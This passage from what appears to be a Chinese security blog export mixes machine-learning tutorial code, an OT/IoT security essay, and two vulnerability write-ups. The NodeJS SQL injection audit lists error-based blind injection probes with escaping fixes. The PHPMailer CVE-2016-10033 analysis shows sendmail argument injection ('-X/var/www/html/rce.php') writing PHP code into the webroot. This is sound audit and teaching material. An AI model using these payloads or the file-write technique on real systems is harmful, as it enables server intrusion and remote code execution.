randIndex = int(random.uniform(0, len(dataIndex))) #随机选择样本更新回归系数            h = sigmoid(sum(dataMatrix[randIndex]*weights))            error = classLabels[randIndex] - h            weights = weights + alpha * error * dataMatrix[randIndex]            del(dataIndex[randIndex])    return weights\n\n\n0x03 实例1\n准备数据\n\n如何处理数据中的缺失值？\n1.使用可用特征的均值来填补缺失值\n2.使用特殊值来填补缺失值\n3.忽略有缺失值的样本\n4.使用相似样本的均值添补缺失值\n5.使用另外的机器学习算法预测缺失值\n\n\n测试算法\n\ndef classifyVector(inX, weights):    &#x27;&#x27;&#x27;    :param inX: 回归系数    :param weights: 特征向量    :return: 0 or 1    &#x27;&#x27;&#x27;    prob = sigmoid(sum(inX*weights))    if prob &gt; 0.5:        return 1.0    else:        return 0.0def colicTest():    frTrain = open(&#x27;horseColicTraining.txt&#x27;)    frTest = open(&#x27;horseColicTest.txt&#x27;)    trainingSet = []    trainingLabels = []    for line in frTrain.readlines():        currLine = line.strip().split(&#x27;\\t&#x27;)        lineArr = []        for i in range(21):            lineArr.append(float(currLine[i]))        trainingSet.append(lineArr)        trainingLabels.append(float(currLine[21]))    trainWeights = stocGradAscent1(array(trainingSet), trainingLabels, 1000) #计算回归系数向量，迭代1000次    errorCount = 0    numTestVec = 0.0    for line in frTest.readlines(): #导入测试集计算分类错误率        numTestVec += 1.0        currLine = line.strip().split(&#x27;\\t&#x27;)        lineArr = []        for i in range(21):            lineArr.append(float(currLine[i]))        if int(classifyVector(array(lineArr), trainWeights)) != int(currLine[21]):            errorCount += 1    errorRate = (float(errorCount)/numTestVec)    print(&quot;the error rate of this test is: %f&quot; % errorRate)    return errorRatedef multiTest():    numTests = 10    errorSum=0.0    for k in range(numTests): # 计算10次求平均值        errorSum += colicTest()    print(&quot;after %d iterations the average error rate is: %f&quot; % (numTests, errorSum/float(numTests)))\n\n\n","categories":["安全数据分析"],"tags":["ML"]},{"title":"Naive Bayes（NB）","url":"/Naive%20Bayes%EF%BC%88NB%EF%BC%89/","content":"0x01 NB朴素：整个形式化的过程只做最原始、最简单的假设\n优点\n\n数据较少情况下仍然有效\n可以处理多类别问题\n\n缺点\n\n对于输入数据的处理方式比较敏感\n\n适用数据类型\n\n标称型\n\n0x02 贝叶斯决策理论计算数据点属于每个类别的概率，并进行比较，选择具有最高概率的决策\n条件概率\n推导过程\n\n\n\n\n\n0x03 构建文档分类器两个假设\n\n特征之间相互独立（统计意义上的独立）\n每个特征同等重要\n\nword2vec\ndef loadDataSet():    &#x27;&#x27;&#x27;    测试数据    :return:     &#x27;&#x27;&#x27;    postingList = [[&#x27;my&#x27;, &#x27;dog&#x27;, &#x27;has&#x27;, &#x27;flea&#x27;, &#x27;problems&#x27;, &#x27;help&#x27;, &#x27;please&#x27;],                 [&#x27;maybe&#x27;, &#x27;not&#x27;, &#x27;take&#x27;, &#x27;him&#x27;, &#x27;to&#x27;, &#x27;dog&#x27;, &#x27;park&#x27;, &#x27;stupid&#x27;],                 [&#x27;my&#x27;, &#x27;dalmation&#x27;, &#x27;is&#x27;, &#x27;so&#x27;, &#x27;cute&#x27;, &#x27;I&#x27;, &#x27;love&#x27;, &#x27;him&#x27;],                 [&#x27;stop&#x27;, &#x27;posting&#x27;, &#x27;stupid&#x27;, &#x27;worthless&#x27;, &#x27;garbage&#x27;],                 [&#x27;mr&#x27;, &#x27;licks&#x27;, &#x27;ate&#x27;, &#x27;my&#x27;, &#x27;steak&#x27;, &#x27;how&#x27;, &#x27;to&#x27;, &#x27;stop&#x27;, &#x27;him&#x27;],                 [&#x27;quit&#x27;, &#x27;buying&#x27;, &#x27;worthless&#x27;, &#x27;dog&#x27;, &#x27;food&#x27;, &#x27;stupid&#x27;]]    classVec = [0, 1, 0, 1, 0, 1]  #是否包含侮辱性词语，为1    return postingList, classVec                 def createVocabList(dataSet):    &#x27;&#x27;&#x27;    创建dataSet的不重复词列表    :param dataSet:     :return:     &#x27;&#x27;&#x27;    vocabSet = set([])    for document in dataSet:        vocabSet = vocabSet | set(document)    return list(vocabSet)def setOfWords2Vec(vocabList, inputSet):    &#x27;&#x27;&#x27;    :param vocabList: 不重复词列表    :param inputSet: 某文档    :return: 文档向量    &#x27;&#x27;&#x27;    returnVec = [0]*len(vocabList) #创建一个长度和vocabList相等的全部为0的向量    for word in inputSet:        if word in vocabList:            returnVec[vocabList.index(word)] = 1        else:            print(&quot;the word: %s is not in my Vocabulary!&quot; % word)    return returnVec #[0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]\n\n训练算法\n\n从词向量计算概率\n\nfor postdoc in postingList:    trainmat.append(setOfWords2Vec(vocablist, postdoc))\n\n通过setOfWords2Vec方法对文档进行处理，返回文档向量\ndef trainNB0(trainMatrix,trainCategory):    numTrainDocs = len(trainMatrix) #6 文档矩阵的行数    numWords = len(trainMatrix[0]) #32 矩阵的长度    pAbusive = sum(trainCategory)/float(numTrainDocs) #3/6  文档属于侮辱类型的概率    p0Num = ones(numWords) #ones函数可以创建任意维度和元素个数的数组，其元素值均为1    p1Num = ones(numWords)    p0Denom = 0.0    p1Denom = 0.0    for i in range(numTrainDocs):        if trainCategory[i] == 1:            p1Num += trainMatrix[i] #如果标签为侮辱性的，则两个列表相加            p1Denom += sum(trainMatrix[i]) #侮辱性文档的词数相加        else:            p0Num += trainMatrix[i]            p0Denom += sum(trainMatrix[i])    #p1num：[2. 2. 1. 1. 1. 1. 2. 1. 1. 2. 2. 1. 1. 1. 4. 2. 3. 2. 1. 1. 1. 1. 2. 2. 2. 2. 1. 1. 1. 2. 1. 3.]    #p1Demon：19.0    p1Vect = log(p1Num/p1Denom)          #将单个词的数目除以总词数得到条件概率    p0Vect = log(p0Num/p0Denom)    return p0Vect, p1Vect, pAbusive\n\n概率向量：在给定文档类别条件下词汇表中单词的出现概率p0Vect:正常文档的概率向量p1Vect:侮辱性文档概率向量pAbusive:侮辱文档的概率\n\n概率值为0问题\n\n利用贝叶斯分类器对文档进行分类时，要计算多个概率的乘积以获得文档属于某个类别的概率，即计算p(w0|1)p(w1|1)p(w2|1)。如果其中一个概率值为0，那么最后的乘积也为0。为降低 这种影响，可以将所有词的出现数初始化为1，并将分母初始化为2\np0Denom = 2.0p1Denom = 2.0\n\n\n下溢出问题\n\n相乘许多很小的数，最后四舍五入后会得到0\np(w0|ci)*p(w1|ci)*...*p(w0|ci) 取对数，得到ln(p(w0|ci))+ln(p(w1|ci))+...+ln(p(w0|ci))\np1Vect = log(p1Num/p1Denom)         p0Vect = log(p0Num/p0Denom)\n\n测试算法\n\n的含义为给定w向量的基础上来自类别ci的概率是多少\np(ci)的概率为pAbusive接下来需要计算p(w|ci)，假设所有词都互相独立，即p(w0,w1,w2..wN|ci)=p(w0|ci)p(w1|ci)p(w2|ci)...p(wN|ci)\n因为P(w)P(ci)两者是一样的，可以忽略\n因为log(p(w|c)p(c)) = log(p(w|c)) + log(p(c))，所以在classifyNB方法中求和\ndef classifyNB(vec2Classify, p0Vec, p1Vec, pClass1):    &#x27;&#x27;&#x27;    元素相乘    :param vec2Classify:要分类的向量    :param p0Vec:正常文档概率向量    :param p1Vec:侮辱文档概率向量    :param pClass1:侮辱文档的概率    :return:1 or 0    &#x27;&#x27;&#x27;    p1 = sum(vec2Classify * p1Vec) + log(pClass1)    p0 = sum(vec2Classify * p0Vec) + log(1.0 - pClass1)    if p1 &gt; p0:        return 1    else:         return 0\n\n便利函数\ndef testingNB():    listOPosts,listClasses = loadDataSet()    myVocabList = createVocabList(listOPosts)    trainMat=[]    for postinDoc in listOPosts:        trainMat.append(setOfWords2Vec(myVocabList, postinDoc))    p0V,p1V,pAb = trainNB0(array(trainMat), array(listClasses))    testEntry = [&#x27;love&#x27;, &#x27;my&#x27;, &#x27;dalmation&#x27;]    thisDoc = array(setOfWords2Vec(myVocabList, testEntry))    print(testEntry, &#x27;classified as: &#x27;, classifyNB(thisDoc, p0V, p1V, pAb))    testEntry = [&#x27;stupid&#x27;, &#x27;garbage&#x27;]    thisDoc = array(setOfWords2Vec(myVocabList, testEntry))    print(testEntry, &#x27;classified as: &#x27;, classifyNB(thisDoc, p0V, p1V, pAb))\n\n\n\n词袋模型\n\n在词袋中，每个单词可以出现 多次，而在词集中，每个词只能出现一次\n每当遇到一个单词时，词向量中的对应值会+1\ndef bagOfWords2VecMN(vocabList, inputSet):    returnVec = [0]*len(vocabList)    for word in inputSet:        if word in vocabList:            returnVec[vocabList.index(word)] += 1    return returnVec\n\n\n0x04 Action 1垃圾邮件判断\ndef textParse(bigString):    &#x27;&#x27;&#x27;    简单分词处理    :param bigString:     :return:     &#x27;&#x27;&#x27;    import re    listOfTokens = re.split(&#x27;\\W*&#x27;, bigString)    return [tok.lower() for tok in listOfTokens if len(tok) &gt; 2] #取长度大于3，转化为小写    def spamTest():    &#x27;&#x27;&#x27;    数据输入    处理    分割    训练    测试    :return:     &#x27;&#x27;&#x27;    docList=[]    classList = []    fullText = []    for i in range(1, 26):        wordList = textParse(open(&#x27;email/spam/%d.txt&#x27; % i, &#x27;rb&#x27;).read().decode(&#x27;GBK&#x27;, &#x27;ignore&#x27;))        docList.append(wordList)        fullText.extend(wordList)        classList.append(1)        wordList = textParse(open(&#x27;email/ham/%d.txt&#x27; % i, &#x27;rb&#x27;).read().decode(&#x27;GBK&#x27;, &#x27;ignore&#x27;))        docList.append(wordList)        fullText.extend(wordList)        classList.append(0)    vocabList = createVocabList(docList) #创建不重复词表    trainingSet = list(range(50)) #[0, 1, 2, 3, 4, 5, 6, 7, 8...44, 45, 46, 47, 48, 49]    testSet=[]    for i in range(10): #随机选择10条数据作为测试集        randIndex = int(random.uniform(0, len(trainingSet)))        testSet.append(trainingSet[randIndex])        del(trainingSet[randIndex])      trainMat = []    trainClasses = []    for docIndex in trainingSet: # 训练集        trainMat.append(bagOfWords2VecMN(vocabList, docList[docIndex])) #词袋模型，构建词向量        trainClasses.append(classList[docIndex])    p0V, p1V, pSpam = trainNB0(array(trainMat), array(trainClasses))    errorCount = 0    for docIndex in testSet: # 测试集        wordVector = bagOfWords2VecMN(vocabList, docList[docIndex])        if classifyNB(array(wordVector), p0V, p1V, pSpam) != classList[docIndex]:            errorCount += 1            print(&quot;classification error&quot;, docList[docIndex])    print(&#x27;the error rate is: &#x27;, float(errorCount)/len(testSet))\n\n\n\n\n","categories":["安全数据分析"],"tags":["ML"]},{"title":"NodeJS sql注入漏洞审计和修复","url":"/NodeJS%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%92%8C%E4%BF%AE%E5%A4%8D/","content":"一、问题代码async search(  ……  let rows = await getManager().query(`    SELECT DISTINCT(id),        name,        description,        gmt_modified    FROM(      SELECT a.*,       ……      WHERE name LIKE &#x27;%$&#123;name&#125;%&#x27; OR tag_name LIKE &#x27;%$&#123;name&#125;%&#x27;      ORDER BY gmt_modified DESC       LIMIT 20  `);  …….\n\n\n二、黑盒测试过程：/api/search?name=123’\n{“success”:false,”errormsg”:”er_parse_error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ‘Ͽor tag_name like ‘\u00123’Ͽn      order by gmt_modified desc \\n      limit’ at line 18”}\n/api/search?name=123’’\n{“success”:true,”data”:[]}\n/api/search?name=123&#39;and’’=‘\n{“success”:true,”data”:[]}\n/api/search?name=&#39;and if(1=1,exp(999),3)and&#39;1\n{“success”:false,”errormsg”:”er_data_out_of_range: double value is out of range in ‘exp(999)’”}\n/api/search?name=&#39;and if(1=2,exp(999),3)and&#39;1\n{“success”:true,”data”:[{“id”:82,……}]}\n三、修复方案\nmysql.escapeId(identifier)、connection.escapeId(identifier) 或 pool.escapeId(identifier) \n\nvar sorter = &#x27;date&#x27;;var sql    = &#x27;SELECT * FROM posts ORDER BY &#x27; + connection.escapeId(sorter);connection.query(sql, function (error, results, fields) &#123;  if (error) throw error;  // ...&#125;);\n\nvar sorter = &#x27;date&#x27;;var sql    = &#x27;SELECT * FROM posts ORDER BY &#x27; + connection.escapeId(&#x27;posts.&#x27; + sorter);// -&gt; SELECT * FROM posts ORDER BY `posts`.`date`\n\n\nreparing Queries\n\nvar sql = &quot;SELECT * FROM ?? WHERE ?? = ?&quot;;var inserts = [&#x27;users&#x27;, &#x27;id&#x27;, userId];sql = mysql.format(sql, inserts);\n\n\nCustom format\n\nconnection.config.queryFormat = function (query, values) &#123;  if (!values) return query;  return query.replace(/\\:(\\w+)/g, function (txt, key) &#123;    if (values.hasOwnProperty(key)) &#123;      return this.escape(values[key]);    &#125;    return txt;  &#125;.bind(this));&#125;;connection.query(&quot;UPDATE posts SET title = :title&quot;, &#123; title: &quot;Hello MySQL&quot; &#125;);\n\n参考： https://github.com/mysqljs/mysql#escaping-query-identifiers\n","categories":["WEB安全"],"tags":["NodeJS"]},{"title":"OT环境下IoT安全的破局探索","url":"/OT%E7%8E%AF%E5%A2%83%E4%B8%8BIoT%E5%AE%89%E5%85%A8%E7%9A%84%E7%A0%B4%E5%B1%80%E6%8E%A2%E7%B4%A2/","content":"下面的PPT是之前在一次沙龙上分享的，偶然翻到，分享一下\n\n产品链接：https://www.aliyun.com/product/developerservices/cmn (不是广告，而是和云网管合作的一个IoT安全网关产品，作为这个产品的PM，不正经的体验了一次产品创造的快乐)\n配合这两篇文章食用味道更佳\n2020 IoT Threat Report\n网络安全架构体系参考——操作技术(OT)安全架构参考\n在2019年就开始尝试去解决OT环境（物流仓）下的安全风险了，尝试了很多方向，但是这个领域可以借鉴的实在太少，OT环境下的网络环境是非常脆弱的，一个网络设备故障、一个小小的勒索病毒往往就会使整个仓库停摆，边分析风险CASE，边优化产品方案，直到看到《2020 IoT Threat Report》这篇文章，发现设计的方案和文中的观点基本一致，间接验证了方向是对的，那剩下的就是去落地了。\n无论是线上还是线下，资产管理永远是个难题，如果管控OT环境中的资产，知道有多少、有哪些、新增哪些、减少哪些？这是第一个要解决的问题，要解决它，那就必须要有IoT资产识别的能力，维护资产指纹是个耗时耗力的工程。但是一旦解决了这部分，就具备了IoT设备准入、风险设备阻断的能力，所以这是必须要去做的部分。\n影响OT环境网络稳定性的风险有两类，网络风险和安全风险。\n\n网络攻击导致仓内作业链路中断\n 恶意代码、勒索病毒、拒绝服务等\n\n网络故障导致仓内作业链路中断\n 线路中断、DNS故障、网络设备故障等\n\n\n要解决网络风险，就要具备OT环境的风险识别能力，但是OT环境中设备的多样性，不可能在所有端上部署AGENT，同时网络环境的脆弱性，也不允许将网关串联到网络中，所以自然而然，旁路流量镜像+云上流计算风险识别就成了最优解。\n剩下还有一个网络稳定性的风险，这个过于专业，需要专业的产品来做，CMN是阿里集团内部自动化运维产品的商业化，能力经过检验，最适合来解决这个风险，同时安全能力也能提高CMN的产品竞争力，一拍即合。\n更具体的架构看下文的ppt，许多技术细节因为是内部产品不便公开，另外这个项目是笔者在应用安全工作之外尝试做的部分，过程中有无数次想摆烂，不过回想起来还是蛮有趣的一段经历，有感兴趣的可以在数据安全的前提下一起探讨。\n对了，它的名字叫“磐石盾”。\n\n","categories":["安全架构"],"tags":["THINK"]},{"title":"PHPMailer < 5.2.18 Remote Code Execution(CVE-2016-10033)","url":"/PHPMailer%20%3C%205.2.18%20Remote%20Code%20Execution(CVE-2016-10033)/","content":"关键代码如下\nprotected function mailSend($header, $body)&#123;  $toArr = array();  foreach ($this-&gt;to as $toaddr) &#123;      $toArr[] = $this-&gt;addrFormat($toaddr);  &#125;  $to = implode(&#x27;, &#x27;, $toArr);  $params = null;  //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver  if (!empty($this-&gt;Sender)) &#123;      $params = sprintf(&#x27;-f%s&#x27;, $this-&gt;Sender);  &#125;  if ($this-&gt;Sender != &#x27;&#x27; and !ini_get(&#x27;safe_mode&#x27;)) &#123;      $old_from = ini_get(&#x27;sendmail_from&#x27;);      ini_set(&#x27;sendmail_from&#x27;, $this-&gt;Sender);  &#125;  $result = false;  if ($this-&gt;SingleTo and count($toArr) &gt; 1) &#123;      foreach ($toArr as $toAddr) &#123;          $result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params);          $this-&gt;doCallback($result, array($toAddr), $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);      &#125;  &#125; else &#123;      $result = $this-&gt;mailPassthru($to, $this-&gt;Subject, $body, $header, $params);      $this-&gt;doCallback($result, $this-&gt;to, $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);  &#125;  if (isset($old_from)) &#123;      ini_set(&#x27;sendmail_from&#x27;, $old_from);  &#125;  if (!$result) &#123;      throw new phpmailerException($this-&gt;lang(&#x27;instantiate&#x27;), self::STOP_CRITICAL);  &#125;  return true;&#125;\n\n已知问题代码出现在mail()函数，首先定位到$result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params);这行代码。通过mailPassthru跟踪到下面这段代码\nprivate function mailPassthru($to, $subject, $body, $header, $params)    &#123;        //Check overloading of mail function to avoid double-encoding        if (ini_get(&#x27;mbstring.func_overload&#x27;) &amp; 1) &#123;            $subject = $this-&gt;secureHeader($subject);        &#125; else &#123;            $subject = $this-&gt;encodeHeader($this-&gt;secureHeader($subject));        &#125;        //Can&#x27;t use additional_parameters in safe_mode        //@link http://php.net/manual/en/function.mail.php        if (ini_get(&#x27;safe_mode&#x27;) or !$this-&gt;UseSendmailOptions or is_null($params)) &#123;            $result = @mail($to, $subject, $body, $header);        &#125; else &#123;            $result = @mail($to, $subject, $body, $header, $params);        &#125;        return $result;    &#125;\n\n根据这段if (ini_get(&#39;safe_mode&#39;) or !$this-&gt;UseSendmailOptions or is_null($params)) &#123;     $result = @mail($to, $subject, $body, $header);可以看到只有safe_mode没有开启的情况下才存在漏洞。\n假设这个函数没有开启，继续追踪到关键函数$result = @mail($to, $subject, $body, $header, $params);接下来看一看这个函数到底是怎么绕过的，追踪$params参数在setFrom()函数中发现这个参数\npublic function setFrom($address, $name = &#x27;&#x27;, $auto = true)    &#123;        $address = trim($address);        $name = trim(preg_replace(&#x27;/[\\r\\n]+/&#x27;, &#x27;&#x27;, $name)); //Strip breaks and trim        // Don&#x27;t validate now addresses with IDN. Will be done in send().        if (($pos = strrpos($address, &#x27;@&#x27;)) === false or            (!$this-&gt;has8bitChars(substr($address, ++$pos)) or !$this-&gt;idnSupported()) and            !$this-&gt;validateAddress($address)) &#123;            $error_message = $this-&gt;lang(&#x27;invalid_address&#x27;) . &quot; (setFrom) $address&quot;;            $this-&gt;setError($error_message);            $this-&gt;edebug($error_message);            if ($this-&gt;exceptions) &#123;                throw new phpmailerException($error_message);            &#125;            return false;        &#125;        $this-&gt;From = $address;        $this-&gt;FromName = $name;        if ($auto) &#123;            if (empty($this-&gt;Sender)) &#123;                $this-&gt;Sender = $address;            &#125;        &#125;        return true;    &#125;\n函数中对address参数进行了过滤，既然这样，那问题肯定就是出现在过滤函数中了，继续往下找\n过滤函数validateAddress\npublic static function validateAddress($address, $patternselect = null)    &#123;        if (is_null($patternselect)) &#123;            $patternselect = self::$validator;        &#125;        if (is_callable($patternselect)) &#123;            return call_user_func($patternselect, $address);        &#125;        //Reject line breaks in addresses; it&#x27;s valid RFC5322, but not RFC5321        if (strpos($address, &quot;\\n&quot;) !== false or strpos($address, &quot;\\r&quot;) !== false) &#123;            return false;        &#125;        if (!$patternselect or $patternselect == &#x27;auto&#x27;) &#123;            //Check this constant first so it works when extension_loaded() is disabled by safe mode            //Constant was added in PHP 5.2.4            if (defined(&#x27;PCRE_VERSION&#x27;)) &#123;                //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2                if (version_compare(PCRE_VERSION, &#x27;8.0.3&#x27;) &gt;= 0) &#123;                    $patternselect = &#x27;pcre8&#x27;;                &#125; else &#123;                    $patternselect = &#x27;pcre&#x27;;                &#125;            &#125; elseif (function_exists(&#x27;extension_loaded&#x27;) and extension_loaded(&#x27;pcre&#x27;)) &#123;                //Fall back to older PCRE                $patternselect = &#x27;pcre&#x27;;            &#125; else &#123;                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension                if (version_compare(PHP_VERSION, &#x27;5.2.0&#x27;) &gt;= 0) &#123;                    $patternselect = &#x27;php&#x27;;                &#125; else &#123;                    $patternselect = &#x27;noregex&#x27;;                &#125;            &#125;        &#125;        switch ($patternselect) &#123;            case &#x27;pcre8&#x27;:                /**                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.                 * @link http://squiloople.com/2009/12/20/email-address-validation/                 * @copyright 2009-2010 Michael Rushton                 * Feel free to use and redistribute this code. But please keep this copyright notice.                 */                return (boolean)preg_match(                    &#x27;/^(?!(?&gt;(?1)&quot;?(?&gt;\\\\\\[ -~]|[^&quot;])&quot;?(?1))&#123;255,&#125;)(?!(?&gt;(?1)&quot;?(?&gt;\\\\\\[ -~]|[^&quot;])&quot;?(?1))&#123;65,&#125;@)&#x27; .                    &#x27;((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\\x0D\\x0A)?[\\t ])+|(?&gt;[\\t ]*\\x0D\\x0A)?[\\t ]+)?)(\\((?&gt;(?2)&#x27; .                    &#x27;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-\\&#x27;*-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]|(?3)))*(?2)\\)))+(?2))|(?2))?)&#x27; .                    &#x27;([!#-\\&#x27;*+\\/-9=?^-~-]+|&quot;(?&gt;(?2)(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]))*&#x27; .                    &#x27;(?2)&quot;)(?&gt;(?1)\\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]&#123;64,&#125;)(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)&#x27; .                    &#x27;(?&gt;(?1)\\.(?!(?1)[a-z0-9-]&#123;64,&#125;)(?1)(?5))&#123;0,126&#125;|\\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]&#123;1,4&#125;)(?&gt;:(?6))&#123;7&#125;&#x27; .                    &#x27;|(?!(?:.*[a-f0-9][:\\]])&#123;8,&#125;)((?6)(?&gt;:(?6))&#123;0,6&#125;)?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6))&#123;5&#125;:&#x27; .                    &#x27;|(?!(?:.*[a-f0-9]:)&#123;6,&#125;)(?8)?::(?&gt;((?6)(?&gt;:(?6))&#123;0,4&#125;):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;&#x27; .                    &#x27;|[1-9]?[0-9])(?&gt;\\.(?9))&#123;3&#125;))\\])(?1)$/isD&#x27;,                    $address                );            case &#x27;pcre&#x27;:                //An older regex that doesn&#x27;t need a recent PCRE                return (boolean)preg_match(                    &#x27;/^(?!(?&gt;&quot;?(?&gt;\\\\\\[ -~]|[^&quot;])&quot;?)&#123;255,&#125;)(?!(?&gt;&quot;?(?&gt;\\\\\\[ -~]|[^&quot;])&quot;?)&#123;65,&#125;@)(?&gt;&#x27; .                    &#x27;[!#-\\&#x27;*+\\/-9=?^-~-]+|&quot;(?&gt;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\xFF]))*&quot;)&#x27; .                    &#x27;(?&gt;\\.(?&gt;[!#-\\&#x27;*+\\/-9=?^-~-]+|&quot;(?&gt;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\xFF]))*&quot;))*&#x27; .                    &#x27;@(?&gt;(?![a-z0-9-]&#123;64,&#125;)(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\\.(?![a-z0-9-]&#123;64,&#125;)&#x27; .                    &#x27;(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?))&#123;0,126&#125;|\\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]&#123;1,4&#125;)(?&gt;:&#x27; .                    &#x27;[a-f0-9]&#123;1,4&#125;)&#123;7&#125;|(?!(?:.*[a-f0-9][:\\]])&#123;8,&#125;)(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,6&#125;)?&#x27; .                    &#x27;::(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,6&#125;)?))|(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:&#x27; .                    &#x27;[a-f0-9]&#123;1,4&#125;)&#123;5&#125;:|(?!(?:.*[a-f0-9]:)&#123;6,&#125;)(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,4&#125;)?&#x27; .                    &#x27;::(?&gt;(?:[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,4&#125;):)?))?(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;&#x27; .                    &#x27;|[1-9]?[0-9])(?&gt;\\.(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;|[1-9]?[0-9]))&#123;3&#125;))\\])$/isD&#x27;,                    $address                );            case &#x27;html5&#x27;:                /**                 * This is the pattern used in the HTML5 spec for validation of &#x27;email&#x27; type form input elements.                 * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)                 */                return (boolean)preg_match(                    &#x27;/^[a-zA-Z0-9.!#$%&amp;\\&#x27;*+\\/=?^_`&#123;|&#125;~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]&#123;0,61&#125;&#x27; .                    &#x27;[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]&#123;0,61&#125;[a-zA-Z0-9])?)*$/sD&#x27;,                    $address                );            case &#x27;noregex&#x27;:                //No PCRE! Do something _very_ approximate!                //Check the address is 3 chars or longer and contains an @ that&#x27;s not the first or last char                return (strlen($address) &gt;= 3                    and strpos($address, &#x27;@&#x27;) &gt;= 1                    and strpos($address, &#x27;@&#x27;) != strlen($address) - 1);            case &#x27;php&#x27;:            default:                return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);        &#125;    &#125;\n看到这段可以分析出两个限制条件，php版本小于5.2.0并且不支持PCRE才有可能调用  $patternselect = &#39;noregex&#39;;,假设版本小于5.2.0并且不支持PCRE，看一看noregex如何过滤的\ncase &#x27;noregex&#x27;:    //No PCRE! Do something _very_ approximate!    //Check the address is 3 chars or longer and contains an @ that&#x27;s not the first or last char    return (strlen($address) &gt;= 3        and strpos($address, &#x27;@&#x27;) &gt;= 1        and strpos($address, &#x27;@&#x27;) != strlen($address) - 1);\n只要存在@并且长度大于等于3就好了，那这样就可以任意构造这个参数了。接下来继续分析怎么构造会造成漏洞\n这个漏洞的核心是因为php mail()函数漏洞引起的\n首先看一下这个函数http://www.w3school.com.cn/php/func_mail_mail.asp的语法\n语法  mail(to,subject,message,headers,parameters)参数\t描述  to\t必需。规定邮件的接收者。  subject\t必需。规定邮件的主题。该参数不能包含任何换行字符。  message\t必需。规定要发送的消息。  headers\t必需。规定额外的报头，比如 From, Cc 以及 Bcc。  parameters\t必需。规定 sendmail 程序的额外参数。\n\n声明：下面这段摘自绿盟博客，解释的至少比我易懂\n在Linux系统上，mail函数在底层实现中，默认调用Linux的sendmail程序发送邮件。在sendmail程序的参数中，有一个-X选项，用于记录所有的邮件进出流量至log文件中。\n&gt; -X logfile &gt; Log all traffic in and out of mailers in the indicated log &gt; file. This should only be used as a last resort for debugging &gt; mailer bugs. It will log a lot of data very quickly.\n通过-X指定log文件记录邮件流量，实际可以达到写文件的效果。例如，如下php代码\n$to = &#x27;Alice@example.com&#x27;;$subject = &#x27;Hello Alice!&#x27;;$message=‘&lt;?php phhpinfo(); ?&gt;’； $headers = &quot;CC: somebodyelse@example.com&quot;;$options = &#x27;-OQueueDirectory=/tmp -X/var/www/html/rce.php&#x27;;mail($to, $subject, $message, $headers, $options); ?&gt;\n执行后，查看log文件/var/www/html/rce.php\n17220 &lt;&lt;&lt; To: Alice@example.com 17220 &lt;&lt;&lt; Subject: Hello Alice! 17220 &lt;&lt;&lt; X-PHP-Originating-Script: 0:test.php 17220 &lt;&lt;&lt; CC: somebodyelse@example.com 17220 &lt;&lt;&lt; 17220 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt; 17220 &lt;&lt;&lt; 